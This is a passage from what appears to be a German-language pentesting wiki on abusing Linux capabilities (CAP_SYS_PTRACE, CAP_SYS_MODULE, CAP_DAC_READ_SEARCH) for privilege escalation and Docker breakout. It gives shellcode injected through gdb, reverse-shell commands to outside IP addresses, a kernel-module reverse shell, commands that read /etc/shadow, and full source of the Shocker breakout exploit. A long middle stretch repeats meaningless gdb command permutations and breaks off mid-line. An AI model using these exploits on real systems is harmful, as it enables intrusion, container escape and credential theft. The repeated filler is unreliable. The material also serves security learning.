buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (8 - len(buf) % 8 ) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
Führen Sie einen Root-Prozess mit gdb aus und kopieren Sie die zuvor generierten gdb-Zeilen:

```bash
sudo gdb -p <PID>
```

```bash
(gdb) set follow-fork-mode child
(gdb) catch exec
(gdb) run
```

```bash
(gdb) set follow-fork-mode parent
(gdb) catch exec
(gdb) run
```

```bash
(gdb) set follow-fork-mode child
(gdb) catch exec
(gdb) continue
```

```bash
(gdb) set follow-fork-mode parent
(gdb) catch exec
(gdb) continue
```

```bash
(gdb) set follow-fork-mode child
(gdb) catch exec
(gdb) next
```

```bash
(gdb) set follow-fork-mode parent
(gdb) catch exec
(gdb) next
```

```bash
(gdb) set follow-fork-mode child
(gdb) catch exec
(gdb) step
```

```bash
(gdb) set follow-fork-mode parent
(gdb) catch exec
(gdb) step
```

```bash
(gdb) set follow-fork-mode child
(gdb) catch exec
(gdb) finish
```

```bash
(gdb) set follow-fork-mode parent
(gdb) catch exec
(gdb) finish
```

```bash
(gdb) set follow-fork-mode child
(gdb) catch exec
(gdb) until
```

```bash
(gdb) set follow-fork-mode parent
(gdb) catch exec
(gdb) until
```

```bash
(gdb) set follow-fork-mode child
(gdb) catch exec
(gdb) break <function_name>
```

```bash
(gdb) set follow-fork-mode parent
(gdb) catch exec
(gdb) break <function_name>
```

```bash
(gdb) set follow-fork-mode child
(gdb) catch exec
(gdb) watch <variable_name>
```

```bash
(gdb) set follow-fork-mode parent
(gdb) catch exec
(gdb) watch <variable_name>
```

```bash
(gdb) set follow-fork-mode child
(gdb) catch exec
(gdb) info breakpoints
```

```bash
(gdb) set follow-fork-mode parent
(gdb) catch exec
(gdb) info breakpoints
```

```bash
(gdb) set follow-fork-mode child
(gdb) catch exec
(gdb) delete <breakpoint_number>
```

```bash
(gdb) set follow-fork-mode parent
(gdb) catch exec
(gdb) delete <breakpoint_number>
```

```bash
(gdb) set follow-fork-mode child
(gdb) catch exec
(gdb) disable <breakpoint_number>
```

```bash
(gdb) set follow-fork-mode parent
(gdb) catch exec
(gdb) disable <breakpoint_number>
```

```bash
(gdb) set follow-fork-mode child
(gdb) catch exec
(gdb) enable <breakpoint_number>
```

```bash
(gdb) set follow-fork-mode parent
(gdb) catch exec
(gdb) enable <breakpoint_number>
```

```bash
(gdb) set follow-fork-mode child
(gdb) catch exec
(gdb) info threads
```

```bash
(gdb) set follow-fork-mode parent
(gdb) catch exec
(gdb) info threads
```

```bash
(gdb) set follow-fork-mode child
(gdb) catch exec
(gdb) thread <thread_number>
```

```bash
(gdb) set follow-fork-mode parent
(gdb) catch exec
(gdb) thread <thread_number>
```

```bash
(gdb) set follow-fork-mode child
(gdb) catch exec
(gdb) thread apply all <command>
```

```bash
(gdb) set follow-fork-mode parent
(gdb) catch exec
(gdb) thread apply all <command>
```

```bash
(gdb) set follow-fork-mode child
(gdb) catch exec
(gdb) set scheduler-locking on
```

```bash
(gdb) set follow-fork-mode parent
(gdb) catch exec
(gdb) set scheduler-locking on
```

```bash
(gdb) set follow-fork-mode child
(gdb) catch exec
(gdb) set scheduler-locking off
```

```bash
(gdb) set follow-fork-mode parent
(gdb) catch exec
(gdb) set scheduler-locking off
```

```bash
(gdb) set follow-fork-mode child
(gdb) catch exec
(gdb) set detach-on-fork on
```

```bash
(gdb) set follow-fork-mode parent
(gdb) catch exec
(gdb) set detach-on-fork on
```

```bash
(gdb) set follow-fork-mode child
(gdb) catch exec
(gdb) set detach-on-fork off
```

```bash
(gdb) set follow-fork-mode parent
(gdb) catch exec
(gdb) set detach-on-fork off
```

```bash
(gdb) set follow-fork-mode child
(gdb) catch exec
(gdb) set detach-on-fork on
(gdb) run
```

```bash
(gdb) set follow-fork-mode parent
(gdb) catch exec
(gdb) set detach-on-fork on
(gdb) run
```

```bash
(gdb) set follow-fork-mode child
(gdb) catch exec
(gdb) set detach-on-fork off
(gdb) run
```

```bash
(gdb) set follow-fork-mode parent
(gdb) catch exec
(gdb) set detach-on-fork off
(gdb) run
```

```bash
(gdb) set follow-fork-mode child
(gdb) catch exec
(gdb) set detach-on-fork on
(gdb) continue
```

```bash
(gdb) set follow-fork-mode parent
(gdb) catch exec
(gdb) set detach-on-fork on
(gdb) continue
```

```bash
(gdb) set follow-fork-mode child
(gdb) catch exec
(gdb) set detach-on-fork off
(gdb) continue
```

```bash
(gdb) set follow-fork-mode parent
(gdb) catch exec
(gdb) set detach-on-fork off
(gdb) continue
```

```bash
(gdb) set follow-fork-mode child
(gdb) catch exec
(gdb) set detach-on-fork on
(gdb) next
```

```bash
(gdb) set follow-fork-mode parent
(gdb) catch exec
(gdb) set detach-on-fork on
(gdb) next
```

```bash
(gdb) set follow-fork-mode child
(gdb) catch exec
(gdb) set detach-on-fork off
(gdb) next
```

```bash
(gdb) set follow-fork-mode parent
(gdb) catch exec
(gdb) set detach-on-fork off
(gdb) next
```

```bash
(gdb) set follow-fork-mode child
(gdb) catch exec
(gdb) set detach-on-fork on
(gdb) step
```

```bash
(gdb) set follow-fork-mode parent
(gdb) catch exec
(gdb) set detach-on-fork on
(gdb) step
```

```bash
(gdb) set follow-fork-mode child
(gdb) catch exec
(gdb) set detach-on-fork off
(gdb) step
```

```bash
(gdb) set follow-fork-mode parent
(gdb) catch exec
(gdb) set detach-on-fork off
(gdb) step
```

```bash
(gdb) set follow-fork-mode child
(gdb) catch exec
(gdb) set detach-on-fork on
(gdb) finish
```

```bash
(gdb) set follow-fork-mode parent
(gdb) catch exec
(gdb) set detach-on-fork on
(gdb) finish
```

```bash
(gdb) set follow-fork-mode child
(gdb) catch exec
(gdb) set detach-on-fork off
(gdb) finish
```

```bash
(gdb) set follow-fork-mode parent
(gdb) catch exec
(gdb) set detach-on-fork off
(gdb) finish
```

```bash
(gdb) set follow-fork-mode child
(gdb) catch exec
(gdb) set detach-on-fork on
(gdb) until
```

```bash
(gdb) set follow-fork-mode parent
(gdb) catch exec
(gdb) set detach-on-fork on
(gdb) until
```

```bash
(gdb) set follow-fork-mode child
(gdb) catch exec
(gdb) set detach-on-fork off
(gdb) until
```

```bash
(gdb) set follow-fork-mode parent
(gdb) catch exec
(gdb) set detach-on-fork off
(gdb) until
```

```bash
(gdb) set follow-fork-mode child
(gdb) catch exec
(gdb) set detach-on-fork on
(gdb) break <function_name>
```

```bash
(gdb) set follow-fork-mode parent
(gdb) catch exec
(gdb) set detach-on-fork on
(gdb) break <function_name>
```

```bash
(gdb) set follow-fork-mode child
(gdb) catch exec
(gdb) set detach-on-fork off
(gdb) break <function_name>
```

```bash
(gdb) set follow-fork-mode parent
(gdb) catch exec
(gdb) set detach-on-fork off
(gdb) break <function_name>
```

```bash
(gdb) set follow-fork-mode child
(gdb) catch exec
(gdb) set detach-on-fork on
(gdb) watch <variable_name>
```

```bash
(gdb) set follow-fork-mode parent
(gdb) catch exec
(gdb) set detach-on-fork on
(gdb) watch <variable_name>
```

```bash
(gdb) set follow-fork-mode child
(gdb) catch exec
(gdb) set detach-on-fork off
(gdb) watch <variable_name>
```

```bash
(gdb) set follow-fork-mode parent
(gdb) catch exec
(gdb) set detach-on-fork off
(gdb) watch <variable_name>
```

```bash
(gdb) set follow-fork-mode child
(gdb) catch exec
(gdb) set detach-on-fork on
(gdb) info breakpoints
```

```bash
(gdb) set follow-fork-mode parent
(gdb) catch exec
(gdb) set detach-on-fork on
(gdb) info breakpoints
```

```bash
(gdb) set follow-fork-mode child
(gdb) catch exec
(gdb) set detach-on-fork off
(gdb) info breakpoints
```

```bash
(gdb) set follow-fork-mode parent
(gdb) catch exec
(gdb) set detach-on-fork off
(gdb) info breakpoints
```

```bash
(gdb) set follow-fork-mode child
(gdb) catch exec
(gdb) set detach-on-fork on
(gdb) delete <breakpoint_number>
```

```bash
(gdb) set follow-fork-mode parent
(gdb) catch exec
(gdb) set detach-on-fork on
(gdb) delete <breakpoint_number>
```

```bash
(gdb) set follow-fork-mode child
(gdb) catch exec
(gdb) set detach-on-fork off
(gdb) delete <breakpoint_number>
```

```bash
(gdb) set follow-fork-mode parent
(gdb) catch exec
(gdb) set detach-on-fork off
(gdb) delete <breakpoint_number>
```

```bash
(gdb) set follow-fork-mode child
(gdb) catch exec
(gdb) set detach-on-fork on
(gdb) disable <breakpoint_number>
```

```bash
(gdb) set follow-fork-mode parent
(gdb) catch exec
(gdb) set detach-on-fork on
(gdb) disable <breakpoint_number>
```

```bash
(gdb) set follow-fork-mode child
(gdb) catch exec
(gdb) set detach-on-fork off
(gdb) disable <breakpoint_number>
```

```bash
(gdb) set follow-fork-mode parent
(gdb) catch exec
(gdb) set detach-on-fork off
(gdb) disable <breakpoint_number>
```

```bash
(gdb) set follow-fork-mode child
(gdb) catch exec
(gdb) set detach-on-fork on
(gdb) enable <breakpoint_number>
```

```bash
(gdb) set follow-fork-mode parent
(gdb) catch exec
(gdb) set detach-on-fork on
(gdb) enable <breakpoint_number>
```

```bash
(gdb) set follow-fork-mode child
(gdb) catch exec
(gdb) set detach-on-fork off
(gdb) enable <breakpoint_number>
```

```bash
(gdb) set follow-fork-mode parent
(gdb) catch exec
(gdb) set detach-on-fork off
(gdb) enable <breakpoint_number>
```

```bash
(gdb) set follow-fork-mode child
(gdb) catch exec
(gdb) set detach-on-fork on
(gdb) info threads
```

```bash
(gdb) set follow-fork-mode parent
(gdb) catch exec
(gdb) set detach-on-fork on
(gdb) info threads
```

```bash
(gdb) set follow-fork-mode child
(gdb) catch exec
(gdb) set detach-on-fork off
(gdb) info threads
```

```bash
(gdb) set follow-fork-mode parent
(gdb) catch exec
(gdb) set detach-on-fork off
(gdb) info threads
```

```bash
(gdb) set follow-fork-mode child
(gdb) catch exec
(gdb) set detach-on-fork on
(gdb) thread <thread_number>
```

```bash
(gdb) set follow-fork-mode parent
(gdb) catch exec
(gdb) set detach-on-fork on
(gdb) thread <thread_number>
```

```bash
(gdb) set follow-fork-mode child
(gdb) catch exec
(gdb) set detach-on-fork off
(gdb) thread <thread_number>
```

```bash
(gdb) set follow-fork-mode parent
(gdb) catch exec
(gdb) set detach-on-fork off
(gdb) thread <thread_number>
```

```bash
(gdb) set follow-fork-mode child
(gdb) catch exec
(gdb) set detach-on-fork on
(gdb) thread apply all <command>
```

```bash
(gdb) set follow-fork-mode parent
(gdb) catch exec
(gdb) set detach-on-fork on
(gdb) thread apply all <command>
```

```bash
(gdb) set follow-fork-mode child
(gdb) catch exec
(gdb) set detach-on-fork off
(gdb) thread apply all <command>
```

```bash
(gdb) set follow-fork-mode parent
(gdb) catch exec
(gdb) set detach-on-fork off
(gdb) thread apply all <command>
```

```bash
(gdb) set follow-fork-mode child
(gdb) catch exec
(gdb) set detach-on-fork on
(gdb) set scheduler-locking on
```

```bash
(gdb) set follow-fork-mode parent
(gdb) catch exec
(gdb) set detach-on-fork on
(gdb) set scheduler-locking on
```

```bash
(gdb) set follow-fork-mode child
(gdb) catch exec
(gdb) set detach-on-fork off
(gdb) set scheduler-locking on
```

```bash
(gdb) set follow-fork-mode parent
(gdb) catch exec
(gdb) set detach-on-fork off
(gdb) set scheduler-locking on
```

```bash
(gdb) set follow-fork-mode child
(gdb) catch exec
(gdb) set detach-on-fork on
(gdb) set scheduler-locking off
```

```bash
(gdb) set follow-fork-mode parent
(gdb) catch exec
(gdb) set detach-on-fork on
(gdb) set scheduler-locking off
```

```bash
(gdb) set follow-fork-mode child
(gdb) catch exec
(gdb) set detach-on-fork off
(gdb) set scheduler-locking off
```

```bash
(gdb) set follow-fork-mode parent
(gdb) catch exec
(gdb) set detach-on-fork off
(gdb) set scheduler-locking off
```

```bash
(gdb) set follow-fork-mode child
(gdb) catch exec
(gdb) set detach-on-fork on
(gdb) set scheduler-locking on
(gdb) run
```

```bash
(gdb) set follow-fork-mode parent
(gdb) catch exec
(gdb) set detach-on-fork on
(gdb) set scheduler-locking on
(gdb) run
```

```bash
(gdb) set follow-fork-mode child
(gdb) catch exec
(gdb) set detach-on-fork off
(gdb) set scheduler-locking on
(gdb) run
```

```bash
(gdb) set follow-fork-mode parent
(gdb) catch exec
(gdb) set detach-on-fork off
(gdb) set scheduler-locking on
(gdb) run
```

```bash
(gdb) set follow-fork-mode child
(gdb) catch exec
(gdb) set detach-on-fork on
(gdb) set scheduler-locking off
(g
```bash
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) set {long}($rip+0) = 0x296a909090909090
(gdb) set {long}($rip+8) = 0x5e016a5f026a9958
(gdb) set {long}($rip+16) = 0x0002b9489748050f
(gdb) set {long}($rip+24) = 0x48510b0e0a0a2923
(gdb) set {long}($rip+32) = 0x582a6a5a106ae689
(gdb) set {long}($rip+40) = 0xceff485e036a050f
(gdb) set {long}($rip+48) = 0x6af675050f58216a
(gdb) set {long}($rip+56) = 0x69622fbb4899583b
(gdb) set {long}($rip+64) = 0x8948530068732f6e
(gdb) set {long}($rip+72) = 0x050fe689485752e7
(gdb) c
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**Beispiel mit Umgebung (Docker-Breakout) - Ein weiterer gdb-Missbrauch**

Wenn **GDB** installiert ist (oder Sie können es mit `apk add gdb` oder `apt install gdb` zum Beispiel installieren), können Sie **einen Prozess vom Host aus debuggen** und ihn die Funktion `system` aufrufen lassen. (Diese Technik erfordert auch die Fähigkeit `SYS_ADMIN`).
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
Sie werden die Ausgabe des ausgeführten Befehls nicht sehen können, aber er wird von diesem Prozess ausgeführt (um eine Reverse-Shell zu erhalten).

{% hint style="warning" %}
Wenn Sie den Fehler "Kein Symbol "system" im aktuellen Kontext" erhalten, überprüfen Sie das vorherige Beispiel zum Laden eines Shellcodes in ein Programm über gdb.
{% endhint %}

**Beispiel mit Umgebung (Docker-Breakout) - Shellcode-Injektion**

Sie können die aktivierten Fähigkeiten innerhalb des Docker-Containers mit folgendem Befehl überprüfen:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
Liste **Prozesse**, die auf dem **Host** ausgeführt werden `ps -eaf`

1. Erhalte die **Architektur** `uname -m`
2. Finde einen **Shellcode** für die Architektur ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. Finde ein **Programm**, um den **Shellcode** in den Speicher eines Prozesses einzufügen ([https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c](https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c))
4. **Ändere** den **Shellcode** innerhalb des Programms und **kompiliere** es `gcc inject.c -o inject`
5. **Füge** ihn ein und erhalte deine **Shell**: `./inject 299; nc 172.17.0.1 5600`

## CAP\_SYS\_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** ermöglicht einem Prozess das Laden und Entladen von Kernelmodulen (`init_module(2)`, `finit_module(2)` und `delete_module(2)` Systemaufrufe), was direkten Zugriff auf die Kernoperationen des Kernels bietet. Diese Fähigkeit birgt erhebliche Sicherheitsrisiken, da sie Privilegieneskalation und vollständige Kompromittierung des Systems ermöglicht, indem sie Modifikationen am Kernel zulässt und somit alle Linux-Sicherheitsmechanismen umgeht, einschließlich Linux Security Modules und Container-Isolierung.
**Dies bedeutet, dass du Kernelmodule in den Kernel der Host-Maschine einfügen/entfernen kannst.**

**Beispiel mit Binärdatei**

Im folgenden Beispiel hat die Binärdatei **`python`** diese Fähigkeit.
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
Standardmäßig überprüft der Befehl **`modprobe`** die Abhängigkeitsliste und die Zuordnungsdateien im Verzeichnis **`/lib/modules/$(uname -r)`**.\
Um dies auszunutzen, erstellen wir einen gefälschten **lib/modules**-Ordner:
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
Dann **kompilieren Sie das Kernel-Modul, Sie finden unten 2 Beispiele, und kopieren** Sie es in diesen Ordner:
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
Schließlich führen Sie den erforderlichen Python-Code aus, um dieses Kernelmodul zu laden:
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**Beispiel 2 mit Binärdatei**

Im folgenden Beispiel hat die Binärdatei **`kmod`** diese Fähigkeit.
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
Das bedeutet, dass es möglich ist, den Befehl **`insmod`** zu verwenden, um ein Kernel-Modul einzufügen. Folgen Sie dem unten stehenden Beispiel, um eine **Reverse-Shell** unter Ausnutzung dieses Privilegs zu erhalten.

**Beispiel mit Umgebung (Docker-Breakout)**

Sie können die aktivierten Fähigkeiten innerhalb des Docker-Containers mit folgendem Befehl überprüfen:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Im vorherigen Output können Sie sehen, dass die **SYS\_MODULE**-Fähigkeit aktiviert ist.

**Erstellen** Sie das **Kernelmodul**, das einen Reverse-Shell ausführt, und die **Makefile**, um es zu **kompilieren**:

{% code title="reverse-shell.c" %}
```c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```
{% code title="Makefile" %}
```bash
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
{% endcode %}

{% hint style="warning" %}
Der Leerzeichen vor jedem Wort in der Makefile **muss ein Tabulator sein, keine Leerzeichen**!
{% endhint %}

Führen Sie `make` aus, um es zu kompilieren.
```
ake[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
Schließlich starten Sie `nc` in einer Shell und **laden Sie das Modul** von einer anderen aus, um die Shell im nc-Prozess zu erfassen:
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**Der Code dieser Technik wurde aus dem Labor "Abusing SYS\_MODULE Capability" von** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com) **kopiert.**

Ein weiteres Beispiel für diese Technik findet sich unter [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)

## CAP\_DAC\_READ\_SEARCH

[**CAP\_DAC\_READ\_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) ermöglicht einem Prozess, **Berechtigungsprüfungen zum Lesen von Dateien und zum Lesen und Ausführen von Verzeichnissen zu umgehen**. Es wird hauptsächlich für die Dateisuche oder das Lesen von Dateien verwendet. Es ermöglicht jedoch auch einem Prozess, die Funktion `open_by_handle_at(2)` zu verwenden, mit der auf beliebige Dateien zugegriffen werden kann, einschließlich solcher außerhalb des Mount-Namespaces des Prozesses. Der in `open_by_handle_at(2)` verwendete Handle soll ein nicht transparenter Bezeichner sein, der über `name_to_handle_at(2)` erhalten wird, kann jedoch sensible Informationen wie Inode-Nummern enthalten, die anfällig für Manipulationen sind. Das Potenzial für die Ausnutzung dieser Fähigkeit, insbesondere im Kontext von Docker-Containern, wurde von Sebastian Krahmer mit dem Shocker-Exploit demonstriert, wie [hier](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) analysiert wurde.
**Dies bedeutet, dass Sie Berechtigungsprüfungen zum Lesen von Dateien und zum Lesen/Ausführen von Verzeichnissen umgehen können.**

**Beispiel mit einer ausführbaren Datei**

Die ausführbare Datei kann jede Datei lesen. Wenn also eine Datei wie "tar" diese Fähigkeit hat, kann sie die Shadow-Datei lesen:
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**Beispiel mit binary2**

In diesem Fall nehmen wir an, dass das **`python`**-Binärprogramm diese Fähigkeit hat. Um Root-Dateien aufzulisten, könnten Sie Folgendes tun:
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
Und um eine Datei zu lesen, könnten Sie Folgendes tun:
```python
print(open("/etc/shadow", "r").read())
```
**Beispiel in der Umgebung (Docker-Ausbruch)**

Sie können die aktivierten Fähigkeiten innerhalb des Docker-Containers mit folgendem Befehl überprüfen:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Im vorherigen Output können Sie sehen, dass die **DAC\_READ\_SEARCH**-Berechtigung aktiviert ist. Dadurch kann der Container **Prozesse debuggen**.

Sie können lernen, wie die folgende Ausnutzung funktioniert unter [https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3), aber zusammengefasst erlaubt uns **CAP\_DAC\_READ\_SEARCH** nicht nur das Durchsuchen des Dateisystems ohne Berechtigungsprüfungen, sondern entfernt auch explizit jegliche Prüfungen für _**open\_by\_handle\_at(2)**_ und **könnte es unserem Prozess ermöglichen, auf von anderen Prozessen geöffnete sensible Dateien zuzugreifen**.

Der ursprüngliche Exploit, der diese Berechtigungen ausnutzt, um Dateien vom Host zu lesen, kann hier gefunden werden: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c). Die folgende Version wurde **modifiziert, um als ersten Argument die Datei anzugeben, die Sie lesen möchten, und sie in eine Datei zu schreiben**.
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
{% hint style="warning" %}
Der Exploit muss einen Zeiger auf etwas finden, das auf dem Host eingebunden ist. Der ursprüngliche Exploit verwendete die Datei /.dockerinit und diese modifizierte Version verwendet /etc/hostname. Wenn der Exploit nicht funktioniert, müssen Sie möglicherweise eine andere Datei festlegen. Um eine Datei zu finden, die auf dem Host eingebunden ist, führen Sie einfach den Befehl mount aus:
{% endhint %}

![](<../../.gitbook/assets/image (407) (1).png>)

**Der Code dieser Technik wurde aus dem Labor "Abusing DAC\_READ\_SEARCH Capability" von** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com) **kopiert**

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

